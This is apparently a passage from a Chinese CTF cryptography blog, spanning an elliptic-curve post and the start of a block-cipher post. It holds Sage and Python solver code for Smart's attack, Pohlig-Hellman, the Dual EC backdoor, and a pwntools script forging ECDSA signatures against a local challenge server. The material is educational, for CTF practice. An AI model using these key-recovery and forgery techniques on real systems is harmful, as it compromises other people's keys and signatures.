几何加法普通相交三点：$P+Q+R=0$ 普通相交两点：$P+P+Q=0$，$P+Q+Q=0$ （一点相切） 垂直相交两点：$P+Q+0=0$ （垂直X轴） 垂直相交一点：$P+P+0=0$ （垂直X轴+一点相切） 代数加法去掉特殊情况，只考虑两个非零非对称的点 $P=(x_P,y_P)$ 和 $Q=(x_Q,y_Q)$。 若 $P$ 和 $Q$ 不同，即 $x_P \\neq x_Q$，直线斜率 $k=\\cfrac{y_P-y_Q}{x_P-x_Q}$ 若 $P$ 和 $Q$ 相同，即 $x_P =x_Q$，直线斜率 $k=\\cfrac{3x_P^2+a}{2y_P}$ 这条直线和椭圆曲线的交点 $R=(x_R,y_R)$，则： $x_R=k^2-x_P-x_Q$ $y_R=y_P+k(x_R-x_P)=y_Q+k(x_R-x_Q)$ 于是：$P+Q=(x_P,y_P)+(x_Q,y_Q)=-R=(x_R,-y_R)$ 标量积（点积/数乘/倍乘）$Q=nP=P+P+\\cdots+P=\\sum_{i=0}^{n-1}(b_i\\cdot2^i)P,\\quad b_i=\\{0,1\\}$，$b_i$ 为 $n$ 的各比特位值。 对数$Q=nP$，已知 $Q,P$，求 $n$。 ​ 有限域椭圆曲线椭圆曲线是连续的，并不适合用于加密，所以必须把椭圆曲线变成离散的点，把椭圆曲线定义在有限域上。 有限域上的椭圆曲线是指在椭圆曲线的定义式中，所有的系数都是在某个有限域 $\\text{GF}(p)$ 中的元素，其中 $p$ 为一个大素数。 给出一个有限域 $\\text{F}p$， $\\text{F}p$ 中有 $p$（$p$ 为质数）个元素 $0,1,2,\\cdots,p-1$； $\\text{F}p$ 的加法是 $a+b \\equiv c \\pmod p$； $\\text{F}p$ 的乘法是 $a\\times b \\equiv c \\pmod p$； $\\text{F}p$ 的除法是 $\\cfrac{a}{b} \\equiv c \\pmod p$，即 $a \\times b^{-1} \\equiv c \\pmod p$，$b^{-1}$ 为 $b$ 的逆元，满足 $b \\times b^{-1} \\equiv 1 \\pmod p$； $\\text{F}p$ 的单位元是 $1$，零元是 $\\text{O}$； $\\text{F}p$ 域内运算满足交换律、结合律、分配率。 椭圆曲线 $\\text{E}p(a,b)$，$p$ 为质数，$x,y \\in [0,p-1]$：$y^2=x^3+ax+b \\pmod p$， 选择两个满足下列约束条件的小于 $p$ 的非负整数 $a,b$：$4a^3+27b^2 \\neq 0 \\pmod p$。 $\\text{F}p$ 上的椭圆曲线同样有加法： 无穷远点 $\\text{O}$ 是零元，有 $\\text{O}+\\text{O}=\\text{O}$，$\\text{O}+P=P$； $P(x,y)$ 的负元是 $(x,-y \\bmod p)=(x,p-y)$，有 $P+(-P)=\\text{O}$； $P(x_1,y_1),Q(x_2,y_2)$ 的和 $R(x_3,y_3)$ 有如下关系： $x_3 \\equiv k^2-x_1-x_2 \\pmod p$ $y_3 \\equiv k(x_1-x_3)-y_1 \\pmod p$ 若 $P=Q$ 则 $k=\\cfrac{3x_1^2+a}{2y_1}\\pmod p$； 若 $P \\neq Q$ 则 $k=\\cfrac{y_2-y_1}{x_2-x_1} \\pmod p$。 点的阶如果椭圆曲线上一点 $P$，存在最小的正整数 $n$ 使得数乘 $nP=\\text{O}$ ，则将 $n$ 称为 $P$ 的阶；若 $n$ 不存在，则 $P$ 是无限阶的。 加密原理考虑 $K=kG$ ，其中 $K,G$ 为椭圆曲线 $\\text{E}p(a,b)$ 上的点，$n$ 为 $G$ 的阶（$nG=\\text{O}$），$k$ 为小于 $n$ 的整数。 给定 $k$ 和 $G$ ，根据加法法则，计算 $K$ 很容易，但反过来，给定 $K$ 和 $G$，求 $k$ 就非常困难。因为实际使用中的ECC原则上把 $p$ 取得相当大，$n$ 也相当大，要把 $n$ 个解点逐一算出来列成上表是不可能的。 这就是椭圆曲线加密算法的数学依据。 点 $G$ 称为基点 (base point)，$k$ ($k&lt;n$) 为私有密钥 (private key)，$K$ 为公开密钥 (public key)。 通信算法 A选定一条椭圆曲线 $\\text{E}p(a,b)$，并取椭圆曲线上一点作为基点 $G$； A选择一个私有密钥 $k$ ($k&lt;n$)，并生成公开密钥 $K=kG$； A将 $\\text{E}p(a,b)$ 和点 $K,G$ 传给B； B收到信息后，将待传输的明文编码到 $\\text{E}p(a,b)$ 上的一点 $M$，并产生一个随机整数 $r$（$r&lt;n$，$n$ 为 $G$ 的阶数）； B计算点 $C_1=M+rK$ 和 $C_2=rG$； B将 $C_1,C_2$ 传给A； A收到信息后，计算 $C_1-kC_2$，结果就应该是点 $M$。 （$C_1-kC_2=M+rK-krG=M+rkG-krG=M$） 123456789101112131415161718192021222324252627282930#Sagea = b = p = #EllipticCurve([a1, a2, a3, a4, a6]) -- y^2+(a1)xy+(a3)y=x^3+(a2)x^2+(a4)x+(a6)E = EllipticCurve(GF(p), [0, 0, 0, a, b])base = E([, ])pub = E([, ])c1 = E([, ])c2 = E([, ])X = base#Bruteforce secret kfor i in range(1, n): if X == pub: k = i print(&quot;[+] secret k = &quot;, i) break else: X = X + basem = c2 - (c1 * k)print(&quot;[+] x = &quot;, m[0])print(&quot;[+] y = &quot;, m[1])print(&quot;[+] x+y = &quot;, m[0] + m[1]) ​ 参考ECC椭圆曲线加密算法：介绍 ECC椭圆曲线详解(有具体实例) 有限域椭圆曲线定义与计算方式 ECC椭圆曲线密码学的原理、公式推导、例子、Python实现和应用 ​ 常见攻击 Smart’s attack适用情况：$\\text{E.order}()=p$。 123456789101112131415161718192021222324252627282930313233p = A = B = E = EllipticCurve(GF(p),[A,B])P = E(,)Q = E(,)def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k)r = SmartAttack(P, Q, p)print(r) ​ ECDLPECDLP即椭圆曲线上的离散对数问题（The Elliptic Curve Discrete Logarithm Problem）。 椭圆曲线上离散对数问题ECDLP定义如下：给定素数 $p$ 和椭圆曲线 $E$，对 $Q=kP$，在已知 $P,Q$ 的情况下求出小于 $p$ 的正整数 $k$。可以证明由 $k$ 和 $P$ 计算 $Q$ 比较容易，而由 $Q$ 和 $P$ 计算 $k$ 则比较困难。 将椭圆曲线中的加法运算与离散对数中的模乘运算相对应，将椭圆曲线中的乘法运算与离散对数中的模幂运算相对应，我们就可以建立基于椭圆曲线的对应的密码体制。 12345678910111213141516171819#Sage Code 1p = a = b = E = EllipticCurve(GF(p),[a,b])P = E(, ) Q = E(, ) k = discrete_log(Q, P, operation=&#x27;+&#x27;) print(k)#Sage Code 2p = a = b = E = EllipticCurve(GF(p),[a,b])P = E(, ) Q = E(, ) k = P.discrete_log(Q)print(k) Pohlig-Hellman算法算法由Pohlig和Hellman发明，这是一种为解决离散对数问题而提出的攻击方法，早在1978年就被提出。主要思想是对阶数进行分解，比如整数域中 $y = g^x \\pmod p$ 里的 $x$ 以及椭圆曲线离散对数问题中 $Gk = Q$ 的 $G$ 的阶 $n$，这样就把对应的离散对数问题转移到了每个因子条件下对应的离散对数，然后可以利用中国剩余定理进行求解。 假设需要求解的式子为 $Q=lP$，其中 $P$ 为选取的一个基点， $l$ 为选定的随机数，相当于要求解的私钥。 首先求得 $P$ 的阶 $n$ ，即可使得 $nP$ 不存在的最小正整数，将 $n$ 进行分解，设 $n=p_1^{e_1}p_2^{e_2}\\cdots p_r^{e_r}$， 将因子取出，计算 $l_i \\equiv l \\pmod {p_i^{e_i}},\\quad i \\in [1,r]$，即 $\\begin{cases} l \\equiv l_1 \\pmod {p_1^{e_1}} \\newline l \\equiv l_2 \\pmod {p_2^{e_2}} \\newline {\\vdots} \\newline l \\equiv l_r \\pmod {p_r^{e_r}} \\end{cases}$ 如果得到 $l_i(i \\in [1,r])$ 的值就能使用中国剩余定理进行求解得到 $l$，下面求解 $l_i$。 首先将 $l_i$ 设为 $p_i$ 表示的多项式 $l_i=z_0+z_1p_i+z_2p_i^2+ \\cdots +z_{e-1}p_i^{e-1}, \\quad z \\in [0,p_i-1]$， 为计算 $z_i$，分别取 $P_0$ 和 $Q_0$，并取值 $P_0=\\cfrac{n}{p_i}P,\\quad Q_0=\\cfrac{n}{p_i}Q$， 这样有 $p_iP_0=nP$，则可得到 $Q_0=\\cfrac{n}{p_i}Q=\\cfrac{n}{p_i}(lP)=l(\\cfrac{n}{p_i}P)=lP_0$，相当于在原表达式的两边乘上 $\\cfrac{n}{p_i}$， 再转回 $l_i$，先求解 $z_0$： $l_iP=Q \\\\\\Rightarrow l_iP_0=Q_0 \\\\\\Rightarrow (z_0+z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\\\\Rightarrow z_0P_0=Q_0$ 这时便将在 $P$ 域上的离散对数分解到了 $P_0$ 域上，因为 $P_0$ 的阶是 $\\cfrac{n}{p_i}$，已经较原本的阶 $n$ 运算的复杂度小了很多，当然，除非 $n$ 本身就是个大素数。 求得 $z_0$，再代回原式： $(z_0+z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\\\\Rightarrow z_0P_0+(z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\\\\Rightarrow (z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0-z_0P_0 \\\\\\Rightarrow z_1p_i=Q_0-z_0P_0$ 此时就可以求解 $z_1$，然后依次将 $z_i$ 全部算出来，这样我们就得到了 $l_1$，然后便可以代入前面的等式，将 $l_i$ 都求出后即可利用中国剩余定理求出 $l$。 123456789101112131415161718192021222324252627282930313233343536#Sage Code 1p = a = b = gx = gy = px = py = E = EllipticCurve(GF(p), [a, b])G = E(gx, gy)n = E.order()QA = E(px, py)factors = list(factor(n))m = 1moduli = []remainders = []print(f&quot;[+] Running Pohlig Hellman&quot;)print(factors)for i, j in factors: if i &gt; 10**9: print(i) break mod = i**j g2 = G*(n//mod) q2 = QA*(n//mod) r = discrete_log(q2, g2, operation=&#x27;+&#x27;) remainders.append(r) moduli.append(mod) m *= modr = crt(remainders, moduli)print(r) 1234567891011121314151617#Sage Code 2E = EllipticCurve(GF(p), [a, b])P = E()Q = E()factors, exponents = zip(*factor(E.order()))primes = [factors[i] ^ exponents[i] for i in range(len(factors))][:-2]print(primes)dlogs = []for fac in primes: t = int(int(P.order()) // int(fac)) dlog = discrete_log(t*Q,t*P,operation=&quot;+&quot;) dlogs += [dlog] print(&quot;factor: &quot;+str(fac)+&quot;, Discrete Log: &quot;+str(dlog)) #calculates discrete logarithm for each prime orderl = crt(dlogs,primes)print(l) ​ EDCH椭圆曲线迪菲-赫尔曼密钥交换（英语：Elliptic Curve Diffie–Hellman key exchange，缩写为ECDH），是一种匿名的密钥合意协议（Key-agreement protocol），这是迪菲-赫尔曼密钥交换的变种，采用椭圆曲线密码学来加强性能与安全性。在这个协定下，双方利用由椭圆曲线密码学建立的公钥与私钥对，在一个不安全的通道中，建立起安全的共有加密资料。 ECDH一般来说交换的都是私钥，这个密钥一般作为“对称加密”的密钥而被双方在后续数据传输中使用。 ECDH是建立在这样一个前提之上的，给定椭圆曲线上的一个点 $P$，一个整数 $k$，求 $Q=kP$ 很容易；但是通过$Q,P$ 求解 $k$ 很难。 算法描述 A和B双方约定使用ECDH秘钥交换算法，这个时候双方也知道了ECDH算法里的一个大素数 $p$，这个 $p$ 可以看做是一个算法中的常量，$p$ 的位数决定了攻击者破解的难度。还有一个整数 $g$ 用来辅助整个秘钥交换，$g$ 不用很大，双方知道 $g$ 和 $p$ 之后就开始了ECDH交换秘钥的过程。 A知道了共用参数 $p$ 和 $g$，生成整数 $a$ 作为私钥，A利用 $p,g,a$ 通过公式 $g^a \\bmod p = A$ 生成 $A$ 作为公钥传递。 B通过链路收到A发来的 $p,g,A$，知道了A的公钥 $A$。这个时候B也生成自己的私钥 $b$，然后通过公式 $g^b \\bmod p = B$ 生成自己公钥 $B$。 在发送公钥 $B$ 前，B通过 $A^b \\bmod p = K$ 生成 $K$ 作为公共密钥，但是并不发送给A。 A收到B发来的公钥 $B$ 以后，同样通过 $B^a \\bmod p = K$ 生成公共密钥 $K$，这样A和B就通过不传递私钥 $a$ 和 $b$ 完成了对公共密钥 $K$ 的协商。 中间人只知道 $A$ 和 $B$ 以及椭圆曲线的公共参数，是无法算出共享密钥 $K$ 的。 这其实就是迪菲-赫尔曼问题：给定三个点 $P,aP,bP$，那么 $abP$ 的结果是什么？ 或者可以这么理解：给定三个整数 $k,k^x,k^y$，那么 $k^{xy}$ 的结果是什么？ 参考 ECDH秘钥协商算法原理 ECC椭圆曲线加密算法：ECDH 和 ECDSA 攻击 中间人攻击（MITM） 异或 Cryptography Dispatches: The Most Backdoor-Looking Bug I’ve Ever Seen Human-server - Union CTF 2021 ​ ECElGamal在密码学中，ElGamal加密算法是一个基于迪菲-赫尔曼密钥交换的非对称加密算法。GnuPG和PGP等很多密码学系统中都应用到了ElGamal算法。 ElGamal加密算法可以定义在任何循环群 $G$ 上。它的安全性取决于 $G$ 上的离散对数难题。 密钥生成 选取一条椭圆曲线 $\\text{E}_p(a,b)$，将明文消息 $m$ 嵌入到曲线上的点 $P_m$，再对点 $P_m$ 做加密变换。 取 $\\text{E}_p(a,b)$ 的一个生成元（基点） $G$， $\\text{E}_p(a,b)$ 和 $G$ 作为公开参数。 A选 $n_A$ 作为密钥，以 $P_A=n_AG$ 作为公钥。 加密过程 用户B向A发送消息 $P_m$，选取一个随机的正整数 $k$，产生以下点对作为密文： $C_m=(kG,P_m+kP_A)$。 解密过程 A以密文点对中的第二个点，减去用自己的密钥与第一个点的倍乘，即： $P_m+kP_A-n_AkG=P_m+k(n_AG)-n_AkG=P_m$。 ​ ECDSA椭圆曲线数字签名算法（英语：Elliptic Curve Digital Signature Algorithm，缩写：ECDSA）是一种基于椭圆曲线密码学的公开密钥加密算法。 ECDSA是DSA作用于椭圆曲线的一个变种算法。A和B仍然使用同样的曲线，ECDSA需要使用明文的哈希结果，而不是明文本身。哈希函数的选择取决于使用者，但是需要明确的是必须选择加密安全的哈希函数。 场景：Alice 想要使用她的私钥 $d_A$ 来签名，Bob 想用 Alice 的公钥 $H_A$ 要验证签名（$H_A=d_AG$），只有 Alice 才能提供正确的签名，而每个人都可以验证签名。 签名过程 A使用算法来签名的步骤： 选取一条椭圆曲线 $\\text{E}_p(a,b)$； 选取一个随机数 $k\\quad (k\\in[1,n-1])$ (Nonce)，$n$ 为 $\\text{E}_p(a,b)$ 的阶； 选取 $\\text{E}_p(a,b)$ 的一个基点 $G$，计算点 $K=kG$，坐标表示为 $K=(x_K,y_K)$； 计算数字 $r=x_K \\bmod n$； 如果 $r=0$，另选一个 $k$ 并重新计算； 获取数据 $M$ 的Hash值，记为$z=\\text{Hash}(M)$，计算 $s=k^{-1}(z+rd_A) \\bmod n$； 如果 $s=0$，另选一个 $k$ 并重新计算； 输出签名 $(r,s)$。 通俗的说，这个算法一开始生成了 $k$，得益于点乘，$k$ 被隐藏在了 $r$ 中，然后通过 $s$ 的等式将 $r$ 绑定到了消息散列值 $z$ 上。 为了计算 $s$，必须计算 $k^{-1} \\bmod n$，只有在 $n$ 是素数的情况下才能保证这一过程，如果子群的阶不是一个素数，ECDSA 将不起作用。 验证过程 为了验证签名，需要A的公钥 $H_A$、哈希值 $z$ 和签名 $(r,s)$。 计算整数 $u_1=s^{-1}z \\bmod n$； 计算整数 $u_2=s^{-1}r \\bmod n$； 计算点 $P=u_1G+u_2H_A=(s^{-1}zG+s^{-1}rH_A) \\bmod n=s^{-1}G(z+rd_A) \\bmod n$； 只有当 $r=x_P \\bmod n$ 的时候，签名才被成功验证。 参考 ECDSA数字签名算法 ECC椭圆曲线加密算法：ECDH 和 ECDSA 攻击 $k$ 复用（共享 $k$） ECDSA: Handle with Care 参考DSA攻击。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192from gmpy2 import invertfrom hashlib import sha256, sha1from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport string, randomimport ecdsacontext(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)HOST = &quot;127.0.0.1&quot;PORT = 10305r = remote(HOST, PORT)def brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)def recv(keepends=False): return r.recvline(keepends=keepends).strip()def send(anti, msg): r.sendlineafter(anti, msg)def sendHash(): context = recv() prefix, s = parse(&quot;sha256(XXXX+&#123;&#125;) == &#123;&#125;&quot;,context) proof = brute_force(prefix,s) send(&quot;Give me XXXX:&quot;, proof)def getMessage(): recv() recv() msg1 = recv()[-64:] msg2 = recv()[-64:] return msg1, msg2def calculator(msg1, msg2): curve = ecdsa.curves.SECP256k1 G = curve.generator n = G.order() r = 0 while r == 0: random_k = ecdsa.util.randrange(n) k = random_k % n ks = k + n kt = ks + n if ecdsa.util.bit_length(ks) == ecdsa.util.bit_length(n): p1 = kt * G else: p1 = ks * G r = p1.x() % n h1 = ecdsa.util.string_to_number(sha1(msg1).digest()) % n h2 = ecdsa.util.string_to_number(sha1(msg2).digest()) % n x = ((-(h1 + h2)) * invert(2*r, n)) % n prikey = ecdsa.SigningKey.from_secret_exponent(x, ecdsa.curves.SECP256k1, hashfunc=sha1) pubkey = prikey.get_verifying_key() send(&quot;Please choice your options:&quot;, &quot;3&quot;) send(&quot;Please give me your public_key(hex):&quot;, pubkey.to_string().encode(&#x27;hex&#x27;)) sign = prikey.sign(msg1, k = k) send(&quot;Please choice your options:&quot;, &quot;5&quot;) send(&quot;Please give me the message(hex):&quot;, msg1.encode(&#x27;hex&#x27;)) send(&quot;Please give me the signature(hex):&quot;, sign.encode(&#x27;hex&#x27;)) if &quot;Verify successfully!&quot; in recv(): print (&quot;msg1 verify successfully!&quot;) send(&quot;Please choice your options:&quot;, &quot;5&quot;) send(&quot;Please give me the message(hex):&quot;, msg2.encode(&#x27;hex&#x27;)) send(&quot;Please give me the signature(hex):&quot;, sign.encode(&#x27;hex&#x27;)) if &quot;Verify successfully!&quot; in recv(): print (&quot;msg2 verify successfully!&quot;) send(&quot;Please choice your options:&quot;, &quot;6&quot;) send(&quot;Please give me the signature(hex) of the frist message:&quot;, sign.encode(&#x27;hex&#x27;)) send(&quot;Please give me the signature(hex) of the second message:&quot;, sign.encode(&#x27;hex&#x27;))def main(): sendHash() msg1, msg2 = getMessage() calculator(msg1, msg2) r.recvuntil(&quot;&#125;&quot;) r.close()if __name__ == &#x27;__main__&#x27;: main() $k$ 部分泄露+多组 $(r,s)$ 签名 ECDSA: Handle with Care Recovering cryptographic keys from partial Pbctf 2020 - LeaK DownUnderCTF 2020 - impECCable L3HCTF - EzECDSA LLL算法。 $k$ 低位相同+多组 $(r,s)$ 签名 GFCTF2021 - Wtfcrypto ​ Dual EC DRBG双椭圆曲线确定性随机数发生器（Dual_EC_DRBG），也被称作双椭圆曲线随机数发生器，是一种使用椭圆曲线密码学实现的密码学安全伪随机数发生器（CSPRNG）。它的设计者是 NSA，2006 年它被 NIST 作为标准，到 2014 年被移除。 攻击 后门原理： $P=dQ$ 关系中的 $d$ 如果被攻击者知道了，那么攻击者就可以利用 $d$ 构造出之后每一步的 $\\text{state}$，从而可以成功预测每一步的 $r_i$，这个随机数生成器也就被攻破了。 设每一步的 $\\text{state}$ 为 $s_i$，随机数为 $r_i$，随机数对应的椭圆曲线上的点为 $R_i$。 那么对于攻击者来说，已知 $P$、$Q$、$d$、$R_i$，而 $s_i$ 未知。于是有： $\\begin{cases} ((s_i \\cdot P)_x \\cdot P)_x &amp; \\rightarrow s_{i+1} \\newline ((s_i \\cdot P)_x \\cdot Q)_x &amp; \\rightarrow r_i \\end{cases}$ 显然，我们需要求得某一步的 $s_i$，那么之后每一步的 $s_i$ 就都知道了，从而之后的 $r_i$ 我们也都可以预测了。 而论文里的后门就是构造 $d \\cdot r_{i-1}$，其恰好是 $s_i$，于是看似安全的体制就被攻破了。 记 $k_i = (s_i \\cdot P)_x$，有： $\\begin{align} d \\cdot r_{i-1} &amp; = {(d \\cdot R_{i-1})_x = (d \\cdot k_{i-1} \\cdot Q)_x} = {(k_{i-1} \\cdot d \\cdot Q)_x = (k_{i-1} \\cdot P)_x} = {((s_{i-1} \\cdot P)_x \\cdot P)_x = s_i} \\end{align}$ 12345678910111213141516171819202122232425def do_next(s): sP = s * P r = Integer(sP[0]) s_new = Integer((r * P)[0]) rQ = r * Q return Integer(rQ[0]), s_newdef do_guess(r1): try: rQ1 = E.lift_x(r1) except ValueError: return None sP2 = d * rQ1 s2 = Integer(sP2[0]) r2, s3 = do_next(s2) return r2, s3 for i in tqdm(range(256)): r1_guess = (r1 &lt;&lt; 8) + i res = do_guess(r1_guess) if res: r2_guess, s3 = res if r2_guess &gt;&gt; 8 == r2: r3, s4 = do_next(s3) break 参考 Dual EC: A Standardized Back Door UTCTF 2021 - Sleeves ​ EC-LCG给出ECC的7个点的 $x$ 坐标值，满足 $X_i=X_{i-1}+b$，得到关于 $x_b,a,b$ 三个未知数有关的方程，一共6个方程，用Gröbner基求解 $C=kp$。 参考 PREDICTING THE ELLIPTIC CURVE CONGRUENTIAL GENERATOR RCTF 2022 - IS_THIS_LCG?","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"ECC","slug":"ECC","permalink":"https://lazzzaro.github.io/tags/ECC/"}],"author":"Lazzaro"},{"title":"块密码","slug":"crypto-块密码","date":"2020-11-07T10:37:27.000Z","updated":"2022-11-10T17:18:04.847Z","comments":true,"path":"2020/11/07/crypto-块密码/","link":"","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-%E5%9D%97%E5%AF%86%E7%A0%81/","excerpt":"","text":"​ 块密码/分组密码在密码学中，分组加密（英语：Block cipher），又称分块加密或块密码，是一种对称密钥算法。它将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。分组加密是极其重要的加密协议组成，其中典型的如AES和3DES作为美国政府核定的标准加密算法，应用领域从电子邮件加密到银行交易转帐，非常广泛。 分组加密包含两个成对的算法：加密算法 $E$ 和解密算法 $D$，两者互为反函数。每个算法有两个输入：长度为 $n$ 位的组，和长度为 $k$ 位的密钥；两组输入均生成 $n$ 位输出。将两个算法看作函数，$K$ 表示长度为 $k$ 的密钥（密钥长度），$P$ 表示长度为 $n$ 的分组，$P$ 也被表示为明文，$C$ 表示密文，则满足： $E_K(P) = C \\; ; \\quad E_K^{-1}(C)=P$ $E_K(P) := E(K,P): \\{0,1\\}^k \\times \\{0,1\\}^n \\rightarrow \\{0,1\\}^n,$ 对于任意密钥 $K$，$E_K(P)$ 是输入的组的一个置换函数，且可逆地落在 $\\{0,1\\}^n$ 区间。$E$ 的反函数（解密算法）定义为： $E_K^{-1}(C) := D_K(C) = D(K,C): \\{0,1\\}^k \\times \\{0,1\\}^n \\rightarrow \\{0,1\\}^n,$ 例如，一个分组加密算法使用一段 128 位的分组作为明文，相应输出 128 位的密文；而其转换则受加密算法中第二个输入的控制，也就是密钥 $k$。解密算法类似，使用 128 位的密文和对应的密钥，得到原 128 位的明文。 每一个密钥实际上是选择了 $n$ 位输入排列的 $(2^n)!$ 种组合中的一种。 大多数的分组密码在在加密算法中会重复使用某一函数进行多轮运算，典型的轮数在4-32次之间，每一轮的函数R使用不同的子密钥 $K_i$，由原密钥生成，作为输入： $M_i = R_{K_i}(M_{i-1})$ 其中 $M_{0}$ 是最初的明文，$M_{i}$ 是第 $i$ 轮加密后的密文。 ​ 分类AES高级加密标准（英语：Advanced Encryption Standard，缩写：AES），又称Rijndael加密法，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的DES，已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院（NIST）于2001年11月26日发布于FIPS PUB 197，并在2002年5月26日成为有效的标准。现在，高级加密标准已然成为对称密钥加密中最流行的算法之一。 该算法为比利时密码学家Joan Daemen和Vincent Rijmen所设计，结合两位作者的名字，以Rijndael为名投稿高级加密标准的甄选流程。 加密方法： 严格地说，AES和Rijndael加密法并不完全一样（虽然在实际应用中两者可以互换），因为Rijndael加密法可以支持更大范围的区块和密钥长度：AES的区块长度固定为128比特，密钥长度则可以是128，192或256比特；而Rijndael使用的密钥和区块长度均可以是128，192或256比特。加密过程中使用的密钥是由Rijndael密钥生成方案产生。 大多数AES计算是在一个特别的有限域完成的。 AES加密过程是在一个4×4的字节矩阵上运作，这个矩阵又称为“体（state）”，其初值就是一个明文区块（矩阵中一个元素大小就是明文区块中的一个Byte）。（Rijndael加密法因支持更大的区块，其矩阵的“列数（Row number）”可视情况增加）加密时，各轮AES加密循环（除最后一轮外）均包含4个步骤： AddRoundKey 矩阵中的每一个字节都与该次回合密钥（round key）做XOR运算；每个子密钥由密钥生成方案产生。 SubBytes 透过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。 ShiftRows 将矩阵中的每个横列进行循环式移位。 MixColumns 为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。最后一个加密循环中省略MixColumns步骤，而以另一个AddRoundKey取代。 123456789101112131415161718192021222324252627282930313233343536//Java实现import java.io.*;import javax.crypto.spec.SecretKeySpec;import java.security.MessageDigest;import java.util.Arrays;import javax.crypto.Cipher;class test &#123; public static void main (String[] args) throws java.lang.Exception &#123; byte[] plain = &quot;flag&#123;xxxxxxxxx&#125;&quot;.getBytes(); System.out.println(Arrays.toString(plain)); byte[] key = &#123;-114, 62, 98, 26, 54, -7, -59, -47, 55, 88, 18, -1, -99, 116, -51, 62&#125;; SecretKeySpec secretKeySpec = new SecretKeySpec(key, 0, key.length, &quot;AES&quot;); MessageDigest instance = MessageDigest.getInstance(&quot;SHA-256&quot;); instance.reset(); byte[] digest = instance.digest(plain); Cipher instance2 = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); instance2.init(1, secretKeySpec); byte[] cipher = instance2.doFinal(digest); System.out.println(Arrays.toString(cipher)); byte[] c = &#123;11, -35, 55, 10, 62, 79, 125, 62, -28, 115, 77, 4, 73, 0, 11, 121, -126, 85, -83, 109, 1, -98, 35, -68, -4, -122, 14, 110, -28, 111, 22, -125&#125;; secretKeySpec = new SecretKeySpec(key, 0, key.length, &quot;AES&quot;); instance2 = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); instance2.init(2, secretKeySpec); byte[] p = instance2.doFinal(c); System.out.println(Arrays.toString(p)); String out = Base64.getEncoder().encodeToString(p); System.out.println(out); &#125;&#125; ​ DES数据加密标准（英语：Data Encryption Standard，缩写为 DES）是一种对称密钥加密块密码算法，1976年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），随后在国际上广泛流传开来。它基于使用56位密钥的对称算法。这个算法因为包含一些机密设计元素，相对短的密钥长度以及怀疑内含美国国家安全局（NSA）的后门而在开始时有争议，DES因此受到了强烈的学院派式的审查，并以此推动了现代的块密码及其密码分析的发展。 DES现在已经不是一种安全的加密方法，主要因为它使用的56位密钥过短。 加密方法： DES是一种典型的块密码—一种将固定长度的明文通过一系列复杂的操作变成同样长度的密文的算法。对DES而言，块长度为64位。同时，DES使用密钥来自定义变换过程，因此算法认为只有持有加密所用的密钥的用户才能解密密文。密钥表面上是64位的，然而只有其中的56位被实际用于算法，其余8位可以被用于奇偶校验，并在算法中被丢弃。因此，DES的有效密钥长度仅为56位。 算法的整体结有16个相同的处理过程，称为“回次”（round），并在首尾各有一次置换，称为IP与FP（或称IP-1，FP为IP的反函数（即IP“撤销”FP的操作，反之亦然）。IP和FP几乎没有密码学上的重要性，为了在1970年代中期的硬件上简化输入输出数据库的过程而被显式的包括在标准中。 在主处理回次前，数据块被分成两个32位的半块，并被分别处理；这种交叉的方式被称为费斯妥结构。费斯妥结构保证了加密和解密过程足够相似—唯一的区别在于子密钥在解密时是以反向的顺序应用的，而剩余部分均相同。这样的设计大大简化了算法的实现，尤其是硬件实现，因为没有区分加密和解密算法的需要。 费斯妥函数（F函数）将数据半块与某个子密钥进行处理。然后，一个F函数的输出与另一个半块异或之后，再与原本的半块组合并交换顺序，进入下一个回次的处理。在最后一个回次完成时，两个半块需要交换顺序，这是费斯妥结构的一个特点，以保证加解密的过程相似。 费斯妥函数（F函数）每次对半块（32位）进行操作，并包括四个步骤： 扩张 用扩张置换将32位的半块扩展到48位，其输出包括8个6位的块，每块包含4位对应的输入位，加上两个邻接的块中紧邻的位。 与密钥混合 用异或操作将扩张的结果和一个子密钥进行混合。16个48位的子密钥—每个用于一个回次的F变换—是利用密钥调度从主密钥生成的。 S盒 在与子密钥混合之后，块被分成8个6位的块，然后使用“S盒”，或称“置换盒”进行处理。8个S盒的每一个都使用以查找表方式提供的非线性的变换将它的6个输入位变成4个输出位。S盒提供了DES的核心安全性—如果没有S盒，密码会是线性的，很容易破解。 置换 最后，S盒的32个输出位利用固定的置换，“P置换”进行重组。这个设计是为了将每个S盒的4位输出在下一回次的扩张后，使用4个不同的S盒进行处理。 S盒，P置换和E扩张各自满足了克劳德·香农在1940年代提出的实用密码所需的必要条件，“混淆与扩散”。 ​ 加解密工具 openssl加密： openssl enc -aes-128-cbc -in plain.txt -out encrypt.txt -iv f123 -K 1223 -p -p: 